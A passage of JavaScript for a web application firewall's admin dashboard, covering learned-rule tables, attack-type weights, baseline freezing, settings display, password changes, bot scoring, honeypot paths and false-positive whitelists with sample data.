      return `<tr>
        <td style="font-family:monospace;font-size:11px;color:var(--cyan)">${safePattern}</td>
        <td><span class="tag cyan">${r.type || 'unknown'}</span></td>
        <td><span class="tag ${sevClass}">${sev}</span></td>
        <td>${r.hit_count || 0}</td>
        <td style="font-size:11px">${time}</td>
        <td><button class="btn btn-danger" style="padding:4px 8px;font-size:11px" onclick="learnDeleteRule('${safePattern.replace(/'/g,"\\'")}')">误报</button></td>
      </tr>`;
    }).join('');
    tb.innerHTML = rows;
  }).catch(()=>{});
}

// 加载权重详情
function learnLoadWeights(){
  // AutoLearn::getAdjustedWeights() 返回的数据需要新接口，这里先用 report 里的
  api('learn_report').then(res=>{
    if(!res || !res.success) return;
    const tb = document.getElementById('learnWeightsTable');
    const report = res.report || {};
    const weightAdj = report.weight_adjustments || {};
    const baseWeights = {
      'sqli': 1.2, 'sqli_blind': 1.3, 'xss': 1.0, 'rce': 1.4,
      'path_traversal': 1.1, 'webshell': 1.5, 'xxe': 1.2,
      'file_read': 0.9, 'file_inclusion': 1.3, 'obfuscation': 0.7,
    };
    const typeNames = {
      'sqli':'SQL注入','sqli_blind':'盲注SQL','xss':'XSS','rce':'远程代码执行',
      'path_traversal':'路径遍历','webshell':'Webshell','xxe':'XXE注入',
      'file_read':'文件读取','file_inclusion':'文件包含','obfuscation':'混淆',
    };
    const rows = Object.entries(baseWeights).map(([type, base])=>{
      const adj = weightAdj[type] || 0;
      const current = Math.max(0.5, Math.min(2.0, base + adj));
      const trendClass = adj > 0.05 ? 'red' : (adj < -0.05 ? 'green' : 'cyan');
      const adjStr = adj === 0 ? '0' : (adj > 0 ? '+' : '') + adj.toFixed(2);
      return `<tr>
        <td><span class="tag cyan">${typeNames[type] || type}</span></td>
        <td>${base.toFixed(1)}</td>
        <td><span class="tag ${trendClass}">${current.toFixed(2)}</span></td>
        <td>趋势+${((current-base-adj).toFixed(2))}</td>
        <td style="color:${adj>0?'var(--red)':(adj<0?'var(--green)':'var(--text3)')}">${adjStr}</td>
      </tr>`;
    }).join('');
    tb.innerHTML = rows;
  }).catch(()=>{});
}

// 同步冻结按钮状态
function learnSyncFreezeBtn(){
  api('learn_coupling').then(res=>{
    if(!res || !res.success) return;
    const btn = document.getElementById('learnFreezeBtn');
    if(!btn) return;
    if(res.autolearn_frozen){
      btn.innerHTML = '🔥 解冻基线';
      btn.className = 'btn btn-success';
      btn.style.padding = '6px 12px';
      btn.style.fontSize = '12px';
    } else {
      btn.innerHTML = '❄️ 冻结基线';
      btn.className = 'btn';
      btn.style.padding = '6px 12px';
      btn.style.fontSize = '12px';
    }
  }).catch(()=>{});
}

// 刷新
function learnRefresh(){
  learnLoadRules();
  learnLoadWeights();
  learnSyncFreezeBtn();
}

// 冻结/解冻切换
function learnFreezeToggle(){
  api('learn_coupling').then(res=>{
    if(!res || !res.success) return;
    if(res.autolearn_frozen){
      if(!confirm('确认解冻行为基线？\n\n解冻后系统将重新学习新的正常请求模式。')) return;
      api('learn_unfreeze', {}).then(r=>{
        if(r && r.success){
          alert(r.message);
          learnSyncFreezeBtn();
        } else {
          alert(r && r.message ? r.message : '操作失败');
        }
      });
    } else {
      if(!confirm('确认冻结行为基线？\n\n冻结后：\n- 不再学习新的正常请求模式\n- 已有基线继续生效\n- 防止攻击者"教坏"基线')) return;
      api('learn_freeze', {}).then(r=>{
        if(r && r.success){
          alert(r.message);
          learnSyncFreezeBtn();
        } else {
          alert(r && r.message ? r.message : '操作失败');
        }
      });
    }
  });
}

// 重置全部学习数据
function learnReset(){
  if(!confirm('⚠️ 危险操作确认\n\n即将清空所有学习数据：\n- 已学习攻击规则\n- 正常请求基线\n- 权重调整\n- 反馈记录\n\n此操作不可撤销，确定继续？')) return;
  if(!confirm('二次确认：真的要清空全部学习数据吗？')) return;
  api('learn_reset', {}).then(r=>{
    if(r && r.success){
      alert(r.message);
      learnRefresh();
    } else {
      alert(r && r.message ? r.message : '操作失败');
    }
  });
}

// 提交反馈
function learnSubmitFeedback(){
  const payload = document.getElementById('learnFeedbackPayload').value.trim();
  const typeSel = document.getElementById('learnFeedbackType').value;
  const attackType = document.getElementById('learnFeedbackAttackType').value;
  const result = document.getElementById('learnFeedbackResult');
  if(!payload){
    result.innerHTML = '<span class="tag red">请填写载荷内容</span>';
    return;
  }
  if(payload.length > 2000){
    result.innerHTML = '<span class="tag red">载荷过长（上限2000字符）</span>';
    return;
  }
  const isFp = typeSel === 'false_positive';
  api('learn_feedback', {
    payload: payload,
    is_false_positive: isFp ? 1 : 0,
    attack_type: attackType,
  }).then(r=>{
    if(r && r.success){
      result.innerHTML = '<span class="tag green">✓ ' + r.message + '</span>';
      document.getElementById('learnFeedbackPayload').value = '';
      setTimeout(()=>{ result.innerHTML = ''; learnLoadWeights(); }, 3000);
    } else {
      result.innerHTML = '<span class="tag red">' + (r && r.message ? r.message : '提交失败') + '</span>';
    }
  }).catch(e=>{
    result.innerHTML = '<span class="tag red">网络错误</span>';
  });
}

// 删除单条规则（标记为误报）
function learnDeleteRule(pattern){
  if(!confirm(`确认将此规则标记为误报并删除？\n\n规则：${pattern}\n\n系统将同时降低该攻击类型的权重。`)) return;
  api('learn_delete_rule', { pattern: pattern }).then(r=>{
    if(r && r.success){
      alert(r.message);
      learnLoadRules();
    } else {
      alert(r && r.message ? r.message : '删除失败');
    }
  });
}

// ========== 系统设置 ==========
function loadSettings(){
  api('config').then(res=>{
    if(!res || !res.success) return;
    const cfg = res.config || {};
    const tagOf = (val) => {
      if(val === true) return '<span class="tag green">已启用</span>';
      if(val === false) return '<span class="tag red">已关闭</span>';
      if(typeof val === 'number') return `<span class="tag yellow">${val}</span>`;
      return `<span class="tag cyan">${val}</span>`;
    };
    const rows = [
      ['WAF 版本', `<span class="tag cyan">v${cfg.SHIELD_WAF_VERSION}</span>`, '当前运行版本'],
      ['— 沙箱 —', '', ''],
      ['WAF_SANDBOX_MODE', `<span class="tag ${cfg.WAF_SANDBOX_MODE === 'protecting' ? 'green' : 'yellow'}">${cfg.WAF_SANDBOX_MODE}</span>`, 'learning=扫描告警 / protecting=秒删+精准切割'],
      ['WAF_SANDBOX_SCAN_INTERVAL', tagOf(cfg.WAF_SANDBOX_SCAN_INTERVAL), '自动扫描间隔（秒）'],
      ['WAF_SANDBOX_MALWARE_THRESHOLD', tagOf(cfg.WAF_SANDBOX_MALWARE_THRESHOLD), '恶意评分阈值（≥此值判定为恶意）'],
      ['WAF_SANDBOX_INSTANT_DELETE_NEW', tagOf(cfg.WAF_SANDBOX_INSTANT_DELETE_NEW), '新落地恶意文件秒删（仅 protecting 模式）'],
      ['WAF_SANDBOX_AUTO_QUARANTINE', tagOf(cfg.WAF_SANDBOX_AUTO_QUARANTINE), '现有文件含恶意代码时自动隔离'],
      ['WAF_SANDBOX_LEARN_COUPLING', tagOf(cfg.WAF_SANDBOX_LEARN_COUPLING), '沙箱↔AutoLearn 联动（3 集成点）'],
      ['— 上传 —', '', ''],
      ['WAF_UPLOAD_DETECTION', tagOf(cfg.WAF_UPLOAD_DETECTION), '文件上传检测'],
      ['WAF_UPLOAD_GD_VERIFY', tagOf(cfg.WAF_UPLOAD_GD_VERIFY), 'GD 库验证图像真实性'],
      ['WAF_UPLOAD_ALLOW_SVG', tagOf(cfg.WAF_UPLOAD_ALLOW_SVG), '允许 SVG 上传（风险较高）'],
      ['WAF_UPLOAD_BLOCK_THRESHOLD', tagOf(cfg.WAF_UPLOAD_BLOCK_THRESHOLD), '上传拦截评分阈值'],
      ['— 语义 / 学习 —', '', ''],
      ['WAF_SEMANTIC_ENABLED', tagOf(cfg.WAF_SEMANTIC_ENABLED), '语义分析（21 维 = L1-L10 + 11 深度解析器）'],
      ['WAF_SEMANTIC_ENGINE', tagOf(cfg.WAF_SEMANTIC_ENGINE), '语义引擎总开关'],
      ['WAF_SEMANTIC_MEMORY', tagOf(cfg.WAF_SEMANTIC_MEMORY), '语义记忆池（跨请求对比）'],
      ['WAF_ATTACK_CHAIN', tagOf(cfg.WAF_ATTACK_CHAIN), '攻击链分析'],
      ['WAF_AUTOLEARN_ENABLED', tagOf(cfg.WAF_AUTOLEARN_ENABLED), '自动学习（3 次触发即生成规则）'],
      ['— 主动防御 —', '', ''],
      ['WAF_ACTIVE_DEFENSE', tagOf(cfg.WAF_ACTIVE_DEFENSE), '主动防御总开关'],
      ['WAF_HONEYTRAP', tagOf(cfg.WAF_HONEYTRAP), '蜜罐链接'],
      ['WAF_PATH_PREDICTION', tagOf(cfg.WAF_PATH_PREDICTION), '攻击路径预判'],
      ['WAF_FALSE_POSITIVE_GUARD', tagOf(cfg.WAF_FALSE_POSITIVE_GUARD), '7 层误报控制'],
      ['— 评分 —', '', ''],
      ['WAF_SCORER_ENABLED', tagOf(cfg.WAF_SCORER_ENABLED), '评分系统'],
      ['WAF_SCORE_BLOCK', tagOf(cfg.WAF_SCORE_BLOCK), '拦截阈值'],
      ['WAF_SCORE_MONITOR', tagOf(cfg.WAF_SCORE_MONITOR), '监控阈值'],
      ['— 机器人 / CC —', '', ''],
      ['WAF_BOT_VERIFY_DNS', tagOf(cfg.WAF_BOT_VERIFY_DNS), 'DNS 反向解析验证蜘蛛'],
      ['WAF_CC_LIMIT', tagOf(cfg.WAF_CC_LIMIT), 'CC 攻击请求限制（每窗口）'],
      ['WAF_CC_WINDOW', tagOf(cfg.WAF_CC_WINDOW), 'CC 攻击时间窗口（秒）'],
    ];
    const html = rows.map(r=>`<tr>
      <td style="font-family:monospace;font-size:12px">${r[0]}</td>
      <td>${r[1]}</td>
      <td style="font-size:12px;color:var(--text3)">${r[2]}</td>
    </tr>`).join('');
    document.getElementById('settingsTable').innerHTML = html;
  }).catch(e=>{
    document.getElementById('settingsTable').innerHTML = '<tr><td colspan="3" style="text-align:center;color:var(--red);padding:20px">加载失败: ' + e + '</td></tr>';
  });

  // 加载密码信息
  loadPasswordInfo();
}

// ========== 密码管理（WordPress 简化模式） ==========
function pwdApi(action, data, method){
  const opts = {method: method || (data ? 'POST' : 'GET')};
  if(data){
    const fd = new FormData();
    for(const k in data) fd.append(k, data[k]);
    fd.append('csrf_token', window.WAF_CSRF_TOKEN);
    opts.body = fd;
  }
  return fetch('/waf-password-api.php?action=' + action, opts).then(r=>r.json());
}

function loadPasswordInfo(){
  pwdApi('info').then(res=>{
    if(!res.success) return;
    const el = document.getElementById('pwdCustom');
    if(el){
      el.textContent = res.has_custom ? '是' : '否（使用默认密码）';
      el.className = 'tag ' + (res.has_custom ? 'green' : 'yellow');
    }
  });
}

function pwdTab(tab){
  const panel = document.getElementById('pwdPanel');
  if(tab === 'verify-current'){
    panel.innerHTML = `
      <h4 style="margin-bottom:8px">✓ 验证当前密码</h4>
      <p style="color:var(--text3);font-size:12px;margin-bottom:8px">输入密码，验证是否匹配当前配置</p>
      <input type="password" id="pwdVerifyCurInput" placeholder="输入密码" style="width:100%;padding:8px;margin-bottom:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px">
      <button class="btn btn-primary" onclick="pwdDoVerifyCurrent()">验证</button>
      <div id="pwdVerifyCurResult" style="margin-top:12px"></div>
    `;
  } else if(tab === 'change'){
    panel.innerHTML = `
      <h4 style="margin-bottom:8px">🔄 修改密码</h4>
      <p style="color:var(--text3);font-size:12px;margin-bottom:8px">输入新密码，直接更新到 config.php</p>
      <input type="password" id="pwdChangeInput" placeholder="新密码（至少 6 字符）" style="width:100%;padding:8px;margin-bottom:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px">
      <input type="password" id="pwdChangeConfirm" placeholder="确认新密码" style="width:100%;padding:8px;margin-bottom:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px">
      <button class="btn btn-primary" onclick="pwdDoChange()">保存修改</button>
      <div id="pwdChangeResult" style="margin-top:12px"></div>
    `;
  }
}

function pwdDoVerifyCurrent(){
  const v = document.getElementById('pwdVerifyCurInput').value;
  if(!v) return showToast('请输入密码', 'error');
  pwdApi('verify-current', {password: v}, 'POST').then(res=>{
    if(res.success){
      const color = res.valid ? 'var(--green)' : 'var(--red)';
      const icon = res.valid ? '✓' : '✗';
      document.getElementById('pwdVerifyCurResult').innerHTML = `
        <div style="color:${color};padding:12px;background:var(--bg2);border-radius:4px">
          ${icon} ${res.valid ? '密码匹配' : '密码不匹配'}
        </div>
      `;
    } else {
      showToast(res.error || '失败', 'error');
    }
  });
}

function pwdDoChange(){
  const v = document.getElementById('pwdChangeInput').value;
  const c = document.getElementById('pwdChangeConfirm').value;
  if(v.length < 6) return showToast('密码至少 6 字符', 'error');
  if(v !== c) return showToast('两次输入的密码不一致', 'error');
  if(!confirm('确认修改密码？修改后下次登录生效。')) return;
  showToast('保存中...');
  pwdApi('change', {new_password: v}, 'POST').then(res=>{
    if(res.success){
      document.getElementById('pwdChangeResult').innerHTML = `
        <div style="color:var(--green);padding:12px;background:var(--bg2);border-radius:4px">
          ✓ ${res.message}
        </div>
      `;
      showToast('修改成功', 'success');
      loadPasswordInfo();
    } else {
      showToast(res.error || '失败', 'error');
    }
  });
}

// ========== 机器人防护页面 ==========
const BOT_STORAGE_KEY = 'shield_waf_bot_settings';

const defaultScoreRules = [
  { id: 'ua_abnormal', name: 'User-Agent 异常', weight: 15, desc: '缺失/伪造/罕见UA' },
  { id: 'req_freq', name: '请求频率异常', weight: 15, desc: '单位时间请求过多' },
  { id: 'headless', name: '无头浏览器特征', weight: 12, desc: 'webdriver/selenium 检测' },
  { id: 'js_disabled', name: 'JavaScript 禁用', weight: 10, desc: '不执行JS的可疑爬虫' },
  { id: 'cookie_missing', name: 'Cookie 支持缺失', weight: 8, desc: '不接受 Cookie' },
  { id: 'click_behavior', name: '点击行为异常', weight: 10, desc: '无鼠标移动/点击轨迹' },
  { id: 'dwell_time', name: '页面停留时间', weight: 7, desc: '过短或过长' },
  { id: 'referer_missing', name: 'Referer 缺失', weight: 5, desc: '直接访问占比过高' },
  { id: 'resource_load', name: '资源加载异常', weight: 8, desc: '只加载HTML不加载资源' },
  { id: 'ip_reputation', name: 'IP 信誉', weight: 10, desc: '数据中心/代理/IDC IP' },
  { id: 'fingerprint', name: '指纹一致性', weight: 8, desc: '各指纹字段矛盾' },
  { id: 'honeypot_trigger', name: '蜜罐触发', weight: 15, desc: '访问蜜罐链接/资源' },
];

const defaultSearchEngines = [
  { name: 'Google', ua: 'Googlebot', verify: 'DNS 反向+正向', enabled: true },
  { name: 'Bing', ua: 'Bingbot / msnbot', verify: 'DNS 反向+正向', enabled: true },
  { name: '百度', ua: 'Baiduspider', verify: 'DNS 反向+正向', enabled: true },
  { name: 'Yandex', ua: 'YandexBot', verify: 'DNS 反向+正向', enabled: true },
  { name: '360搜索', ua: '360Spider', verify: '头特征验证', enabled: true },
  { name: '搜狗', ua: 'Sogou web spider', verify: '头特征验证', enabled: true },
  { name: '字节跳动', ua: 'Bytespider', verify: '头特征验证', enabled: true },
  { name: '神马搜索', ua: 'ShenmaBot', verify: '头特征验证', enabled: true },
];

const defaultHoneypots = [
  { url: '/admin.php', triggered: 42, enabled: true },
  { url: '/wp-login.php.bak', triggered: 38, enabled: true },
  { url: '/config.bak', triggered: 28, enabled: true },
  { url: '/phpmyadmin/', triggered: 20, enabled: true },
];

let botSettings = null;

function getBotSettings(){
  if(botSettings) return botSettings;
  try{
    const raw = localStorage.getItem(BOT_STORAGE_KEY);
    if(raw){
      botSettings = JSON.parse(raw);
    }
  }catch(e){}
  if(!botSettings){
    botSettings = {
      masterEnabled: true,
      mode: 'verify',
      strictness: 5,
      honeypotEnabled: true,
      captchaEnabled: true,
      captchaThreshold: 60,
      captchaType: 'image',
      scoreRules: JSON.parse(JSON.stringify(defaultScoreRules)),
      searchEngines: JSON.parse(JSON.stringify(defaultSearchEngines)),
      honeypots: JSON.parse(JSON.stringify(defaultHoneypots)),
      uaWhitelist: [],
      ipWhitelist: [],
      dnsWhitelist: [],
    };
    saveBotSettings();
  }
  return botSettings;
}

function saveBotSettings(){
  if(!botSettings) return;
  try{
    localStorage.setItem(BOT_STORAGE_KEY, JSON.stringify(botSettings));
  }catch(e){}
}

function initBotPage(){
  const s = getBotSettings();

  // 总开关
  const ms = document.getElementById('botMasterSwitch');
  if(ms) ms.checked = s.masterEnabled;

  // 防护模式
  setBotModeUI(s.mode);

  // 严格度
  const strict = document.getElementById('botStrictness');
  if(strict){
    strict.value = s.strictness;
    document.getElementById('strictnessVal').textContent = s.strictness;
  }

  // 蜜罐开关
  const hs = document.getElementById('honeypotSwitch');
  if(hs) hs.checked = s.honeypotEnabled;

  // 验证码开关
  const cs = document.getElementById('captchaSwitch');
  if(cs) cs.checked = s.captchaEnabled;

  // 验证码阈值
  const ct = document.getElementById('captchaThreshold');
  if(ct){
    ct.value = s.captchaThreshold;
    document.getElementById('captchaThVal').textContent = s.captchaThreshold;
  }

  // 验证码类型
  setCaptchaTypeUI(s.captchaType);

  // 渲染评分规则
  renderScoreRules();

  // 渲染蜜罐列表
  renderHoneypotList();

  // 渲染搜索引擎列表
  renderSearchEngines();

  // 渲染白名单
  renderWhitelist('ua');
  renderWhitelist('ip');
  renderWhitelist('dns');
}

// 折叠/展开
function toggleCollapse(id){
  const el = document.getElementById(id);
  if(el) el.classList.toggle('collapsed');
}

// 防护模式
function setBotMode(mode){
  const s = getBotSettings();
  s.mode = mode;
  saveBotSettings();
  setBotModeUI(mode);
}
function setBotModeUI(mode){
  document.querySelectorAll('.mode-tab').forEach(t=>{
    t.classList.toggle('active', t.dataset.mode === mode);
  });
}

// 评分规则
function renderScoreRules(){
  const s = getBotSettings();
  const tbody = document.getElementById('scoreRulesBody');
  if(!tbody) return;
  tbody.innerHTML = s.scoreRules.map((rule, idx)=>`
    <tr>
      <td style="font-weight:500">${rule.name}</td>
      <td>
        <div class="weight-slider-wrap">
          <input type="range" min="0" max="30" value="${rule.weight}"
            oninput="updateScoreWeight(${idx}, this.value)">
          <span class="weight-val" id="weight-${idx}">${rule.weight}</span>
        </div>
      </td>
      <td style="color:var(--text3);font-size:12px">${rule.desc}</td>
      <td><button class="btn btn-ghost" style="padding:4px 10px;font-size:11px" onclick="configureRule(${idx})">配置</button></td>
    </tr>
  `).join('');
  updateTotalWeight();
}

function updateScoreWeight(idx, val){
  const s = getBotSettings();
  s.scoreRules[idx].weight = parseInt(val);
  saveBotSettings();
  const el = document.getElementById('weight-' + idx);
  if(el) el.textContent = val;
  updateTotalWeight();
}

function updateTotalWeight(){
  const s = getBotSettings();
  const total = s.scoreRules.reduce((sum, r)=>sum + r.weight, 0);
  const el = document.getElementById('totalWeight');
  if(el) el.textContent = total;
}

function resetScoreWeights(){
  if(!confirm('确认重置所有评分为默认值？')) return;
  const s = getBotSettings();
  s.scoreRules = JSON.parse(JSON.stringify(defaultScoreRules));
  saveBotSettings();
  renderScoreRules();
  showToast('已重置为默认权重', 'success');
}

function configureRule(idx){
  const s = getBotSettings();
  const rule = s.scoreRules[idx];
  showToast('配置: ' + rule.name + '（演示环境）', 'success');
}

// 蜜罐管理
function renderHoneypotList(){
  const s = getBotSettings();
  const list = document.getElementById('honeypotList');
  if(!list) return;
  list.innerHTML = s.honeypots.map((hp, idx)=>`
    <div class="honeypot-item">
      <span class="hp-url">${hp.url}</span>
      <span class="hp-count">触发 ${hp.triggered} 次</span>
      <label class="switch"><input type="checkbox" ${hp.enabled?'checked':''} onchange="toggleHoneypot(${idx})"><span class="slider"></span></label>
      <button class="btn btn-danger" style="padding:4px 10px;font-size:11px" onclick="deleteHoneypot(${idx})">删除</button>
    </div>
  `).join('');
  document.getElementById('honeypotCount').textContent = s.honeypots.length;
  document.getElementById('honeypotTriggered').textContent = s.honeypots.reduce((sum,h)=>sum + h.triggered, 0);
}

function toggleHoneypot(idx){
  const s = getBotSettings();
  s.honeypots[idx].enabled = !s.honeypots[idx].enabled;
  saveBotSettings();
}

function deleteHoneypot(idx){
  if(!confirm('确认删除此蜜罐？')) return;
  const s = getBotSettings();
  s.honeypots.splice(idx, 1);
  saveBotSettings();
  renderHoneypotList();
  showToast('蜜罐已删除', 'success');
}

function addHoneypot(){
  const input = document.getElementById('newHoneypot');
  const url = input.value.trim();
  if(!url){ showToast('请输入蜜罐路径', 'error'); return; }
  if(!url.startsWith('/')){ showToast('路径需以 / 开头', 'error'); return; }
  const s = getBotSettings();
  if(s.honeypots.some(h=>h.url === url)){ showToast('此蜜罐已存在', 'error'); return; }
  s.honeypots.unshift({ url, triggered: 0, enabled: true });
  saveBotSettings();
  renderHoneypotList();
  input.value = '';
  showToast('蜜罐已添加', 'success');
}

// 验证码类型
function setCaptchaType(type){
  const s = getBotSettings();
  s.captchaType = type;
  saveBotSettings();
  setCaptchaTypeUI(type);
}
function setCaptchaTypeUI(type){
  document.querySelectorAll('.captcha-type').forEach(t=>{
    t.classList.toggle('active', t.dataset.type === type);
  });
}

// 白名单类型切换
function setWhitelistType(type){
  ['search','ua','ip','dns'].forEach(t=>{
    const el = document.getElementById('wl-' + t);
    if(el) el.style.display = t === type ? 'block' : 'none';
  });
  document.querySelectorAll('.whitelist-type-tab').forEach(t=>{
    t.classList.toggle('active', t.dataset.type === type);
  });
}

// 搜索引擎列表
function renderSearchEngines(){
  const s = getBotSettings();
  const tbody = document.getElementById('searchEngineBody');
  if(!tbody) return;
  tbody.innerHTML = s.searchEngines.map((se, idx)=>`
    <tr>
      <td style="font-weight:500">${se.name}</td>
      <td style="font-family:monospace;font-size:12px;color:var(--text2)">${se.ua}</td>
      <td style="color:var(--text3);font-size:12px">${se.verify}</td>
      <td><span class="tag ${se.enabled?'green':'red'}">${se.enabled?'已放行':'已禁用'}</span></td>
      <td>
        <label class="switch"><input type="checkbox" ${se.enabled?'checked':''} onchange="toggleSearchEngine(${idx})"><span class="slider"></span></label>
      </td>
    </tr>
  `).join('');
}

function toggleSearchEngine(idx){
  const s = getBotSettings();
  s.searchEngines[idx].enabled = !s.searchEngines[idx].enabled;
  saveBotSettings();
  renderSearchEngines();
}

// 自定义白名单
function renderWhitelist(type){
  const s = getBotSettings();
  const tbody = document.getElementById(type + 'WhitelistBody');
  if(!tbody) return;
  const list = s[type + 'Whitelist'] || [];
  tbody.innerHTML = list.length ? list.map((item, idx)=>{
    if(type === 'dns'){
      return `<tr>
        <td style="font-family:monospace;font-size:12px">${item.value}</td>
        <td style="color:var(--text3);font-size:12px">DNS 反向解析验证</td>
        <td><button class="btn btn-danger" style="padding:4px 10px;font-size:11px" onclick="deleteWhitelist('${type}',${idx})">删除</button></td>
      </tr>`;
    }
    return `<tr>
      <td style="font-family:monospace;font-size:12px">${item.value}</td>
      <td style="color:var(--text3);font-size:12px">${item.time}</td>
      <td><button class="btn btn-danger" style="padding:4px 10px;font-size:11px" onclick="deleteWhitelist('${type}',${idx})">删除</button></td>
    </tr>`;
  }).join('') : `<tr><td colspan="3" style="text-align:center;color:var(--text4);padding:20px">暂无白名单</td></tr>`;
}

function addWhitelist(type){
  const input = document.getElementById('new' + type.charAt(0).toUpperCase() + type.slice(1) + 'Whitelist');
  const val = input.value.trim();
  if(!val){ showToast('请输入内容', 'error'); return; }
  const s = getBotSettings();
  const key = type + 'Whitelist';
  if(!s[key]) s[key] = [];
  if(s[key].some(i=>i.value === val)){ showToast('此条目已存在', 'error'); return; }
  s[key].unshift({ value: val, time: new Date().toLocaleString('zh-CN') });
  saveBotSettings();
  renderWhitelist(type);
  input.value = '';
  showToast('已添加到白名单', 'success');
}

function deleteWhitelist(type, idx){
  if(!confirm('确认删除此白名单？')) return;
  const s = getBotSettings();
  s[type + 'Whitelist'].splice(idx, 1);
  saveBotSettings();
  renderWhitelist(type);
  showToast('已删除', 'success');
}

// ========== 误报中心 ==========
const FP_STORAGE_KEY = 'shield_waf_false_positive';

const defaultFpData = {
  urlWhitelist: [
    { url: '/api/user/info', type: 'exact', note: '用户信息接口', time: '2025-01-15 10:30:00' },
    { url: '/api/upload/image', type: 'prefix', note: '图片上传接口', time: '2025-01-14 14:20:00' },
    { url: '/admin/.*', type: 'regex', note: '后台管理系统', time: '2025-01-13 09:15:00' },
    { url: '/api/order/submit', type: 'exact', note: '订单提交接口', time: '2025-01-12 16:45:00' },
    { url: '/api/payment/notify', type: 'prefix', note: '支付回调接口', time: '2025-01-11 11:00:00' },
    { url: '/static/.*', type: 'regex', note: '静态资源目录', time: '2025-01-10 08:30:00' },
    { url: '/api/search', type: 'exact', note: '搜索接口', time: '2025-01-09 13:20:00' },
    { url: '/api/comment/add', type: 'exact', note: '评论提交', time: '2025-01-08 15:10:00' },
    { url: '/api/feedback', type: 'prefix', note: '反馈相关接口', time: '2025-01-07 10:00:00' },
    { url: '/api/download/.*', type: 'regex', note: '文件下载接口', time: '2025-01-06 17:30:00' },
  ],
  paramWhitelist: [
    { url: '', param: 'content', desc: '富文本内容参数', time: '2025-01-15 10:00:00', global: true },
    { url: '/api/search', param: 'q', desc: '搜索关键词', time: '2025-01-14 14:00:00', global: false },
    { url: '/api/comment/add', param: 'message', desc: '评论内容', time: '2025-01-13 09:00:00', global: false },
    { url: '', param: 'description', desc: '描述类参数', time: '2025-01-12 16:00:00', global: true },
    { url: '/api/article/edit', param: 'body', desc: '文章正文', time: '2025-01-11 11:00:00', global: false },
  ],
  ruleExemptions: [
    { ruleId: 'SQL-INJ-001', reason: '业务系统正常 SQL 查询拼接', scope: '全局', time: '2025-01-15 10:30:00' },
    { ruleId: 'XSS-002', reason: '富文本编辑器允许 HTML 标签', scope: '/api/article/edit', time: '2025-01-14 14:20:00' },
    { ruleId: 'RFI-001', reason: '业务需要远程加载资源', scope: '/api/resource/proxy', time: '2025-01-13 09:15:00' },
    { ruleId: 'CMDi-005', reason: '系统管理后台执行合法命令', scope: '/admin/system', time: '2025-01-12 16:45:00' },
    { ruleId: 'SSRF-003', reason: '业务需要调用内部服务', scope: '/api/internal/call', time: '2025-01-11 11:00:00' },
  ],
  tickets: [
    { id: 'FP-2025-0015', time: '2025-01-18 14:32:00', url: '/api/user/update', type: 'SQL注入', submitter: '张三', status: 'pending' },
    { id: 'FP-2025-0014', time: '2025-01-18 10:15:00', url: '/api/upload/file', type: 'XSS', submitter: '李四', status: 'confirmed' },
    { id: 'FP-2025-0013', time: '2025-01-17 16:45:00', url: '/api/search/advanced', type: 'SQL注入', submitter: '王五', status: 'confirmed' },
    { id: 'FP-2025-0012', time: '2025-01-17 09:20:00', url: '/api/comment/list', type: 'XSS', submitter: '赵六', status: 'rejected' },
    { id: 'FP-2025-0011', time: '2025-01-16 13:10:00', url: '/api/order/export', type: '命令注入', submitter: '钱七', status: 'confirmed' },
    { id: 'FP-2025-0010', time: '2025-01-16 11:30:00', url: '/api/image/process', type: 'SSRF', submitter: '孙八', status: 'pending' },
  ],
  globalParamEnabled: false,
  monthlyProcessed: 47,
};

let fpData = null;

function getFpData(){
  if(fpData) return fpData;
  try{
    const raw = localStorage.getItem(FP_STORAGE_KEY);
    if(raw) fpData = JSON.parse(raw);
  }catch(e){}
  if(!fpData){
    fpData = JSON.parse(JSON.stringify(defaultFpData));
    saveFpData();
  }
  return fpData;
}

function saveFpData(){
  if(!fpData) return;
  try{
    localStorage.setItem(FP_STORAGE_KEY, JSON.stringify(fpData));
  }catch(e){}
}

function loadFalsePositive(){
  const s = getFpData();
  document.getElementById('fpUrlCount').textContent = s.urlWhitelist.length;
  document.getElementById('fpParamCount').textContent = s.paramWhitelist.length;
  document.getElementById('fpRuleExemptCount').textContent = s.ruleExemptions.length;
  document.getElementById('fpMonthlyCount').textContent = s.monthlyProcessed;
  document.getElementById('fpGlobalParam').checked = s.globalParamEnabled;
  renderFpUrlList();
  renderFpParamList();
  renderFpRuleList();
  renderFpTicketList();
}

function renderFpUrlList(){
  const s = getFpData();
  const typeMap = { exact: '完全匹配', prefix: '前缀匹配', regex: '正则匹配' };
  const typeTag = { exact: 'green', prefix: 'blue', regex: 'purple' };
  const tbody = document.getElementById('fpUrlBody');
  if(!tbody) return;
  tbody.innerHTML = s.urlWhitelist.length ? s.urlWhitelist.map((item, idx)=>`
    <tr>
      <td style="font-family:monospace;font-size:12px">${item.url}</td>
      <td><span class="tag ${typeTag[item.type]||'cyan'}">${typeMap[item.type]||item.type}</span></td>
      <td style="color:var(--text3);font-size:12px">${item.note||'-'}</td>
      <td style="color:var(--text3);font-size:11px">${item.time}</td>
      <td><button class="btn btn-danger" style="padding:4px 10px;font-size:11px" onclick="fpUrlDel(${idx})">删除</button></td>
    </tr>
  `).join('') : '<tr><td colspan="5" style="text-align:center;color:var(--text4);padding:20px">暂无白名单</td></tr>';
}

function fpUrlAdd(){
  const url = document.getElementById('fpUrlInput').value.trim();
  const type = document.getElementById('fpUrlType').value;
  const note = document.getElementById('fpUrlNote').value.trim();
  if(!url) return showToast('请输入 URL 路径', 'error');
  const s = getFpData();
  s.urlWhitelist.unshift({
    url, type, note,
    time: new Date().toLocaleString('zh-CN', {hour12:false})
  });
  saveFpData();
  document.getElementById('fpUrlInput').value = '';
  document.getElementById('fpUrlNote').value = '';
  document.getElementById('fpUrlCount').textContent = s.urlWhitelist.length;
  renderFpUrlList();
  showToast('添加成功', 'success');
}

function fpUrlDel(idx){
  if(!confirm('确认删除此 URL 白名单？')) return;
  const s = getFpData();
  s.urlWhitelist.splice(idx, 1);
  saveFpData();
  document.getElementById('fpUrlCount').textContent = s.urlWhitelist.length;
  renderFpUrlList();
  showToast('已删除', 'success');
}

function fpUrlExport(){
  const s = getFpData();
  const data = JSON.stringify(s.urlWhitelist, null, 2);
  const blob = new Blob([data], {type: 'application/json'});
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'url-whitelist.json';
  a.click();
  URL.revokeObjectURL(url);
  showToast('导出成功', 'success');
